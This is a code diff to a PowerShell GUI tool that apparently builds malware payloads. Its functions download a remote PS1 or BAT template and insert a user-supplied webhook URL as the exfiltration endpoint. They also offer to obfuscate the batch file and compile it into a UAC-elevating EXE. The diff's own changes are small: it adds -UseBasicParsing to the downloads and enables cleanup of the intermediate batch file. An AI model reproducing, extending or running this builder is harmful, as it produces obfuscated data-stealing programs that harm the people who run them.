@@ -127,7 +127,7 @@ function Hide-Console {
 function Invoke-PS1 {
     $webhook_url = $var_WEBHOOK_BOX.Text
     $download_url=$download_url+"ps1"
-    Invoke-WebRequest -Uri $download_url -OutFile "main.ps1"
+    Invoke-WebRequest -Uri $download_url -OutFile "main.ps1" -UseBasicParsing
     #replace YOUR_WEBHOOK_HERE from main.ps1 with the new url
     (Get-Content "main.ps1").Replace('YOUR_WEBHOOK_HERE', $webhook_url) | Set-Content "main.ps1"
     $var_OUTPUT_BOX.Text += "Successfully Built PS1`n"
@@ -136,7 +136,7 @@ function Invoke-PS1 {
 function Invoke-BAT {
     $webhook_url = $var_WEBHOOK_BOX.Text
     $download_url=$download_url+"bat"
-    Invoke-WebRequest -Uri $download_url -OutFile "main.bat"
+    Invoke-WebRequest -Uri $download_url -OutFile "main.bat" -UseBasicParsing
     (Get-Content "main.bat").Replace('YOUR_WEBHOOK_HERE', $webhook_url) | Set-Content "main.bat"
     $var_OUTPUT_BOX.Text += "Successfully Built BAT`n"
     $obfuscate_box = [System.Windows.MessageBox]::Show("Do you want to obfuscate the code?", "Obfuscate?", [System.Windows.MessageBoxButton]::YesNo, [System.Windows.MessageBoxImage]::Question)
@@ -158,7 +158,7 @@ function Invoke-BAT {
 function Invoke-EXE {
     $webhook_url = $var_WEBHOOK_BOX.Text
     $download_url=$download_url+"bat"
-    Invoke-WebRequest -Uri $download_url -OutFile "main.bat"
+    Invoke-WebRequest -Uri $download_url -OutFile "main.bat" -UseBasicParsing
     (Get-Content "main.bat").Replace('YOUR_WEBHOOK_HERE', $webhook_url) | Set-Content "main.bat"
     $var_OUTPUT_BOX.Text += "Successfully Built BAT`n"
     $var_OUTPUT_BOX.Text += "Obfuscating BAT`n"
@@ -176,7 +176,7 @@ function Invoke-EXE {
     Start-Process -FilePath "$somalifuscator_dir\setup.bat" -ArgumentList "$current_dir\main.bat exe --uac" -Wait -NoNewWindow
     Move-Item -Path $somalifuscator_dir\main.exe -Destination $current_dir -Force
     $var_OUTPUT_BOX.Text += "Successfully Built EXE`n"
-    #Remove-Item -Path $current_dir\main.bat -ErrorAction SilentlyContinue
+    Remove-Item -Path $current_dir\main.bat -ErrorAction SilentlyContinue
     Remove-Item -Path $current_dir\main.bat.ultimate.bat -ErrorAction SilentlyContinue
 }
 
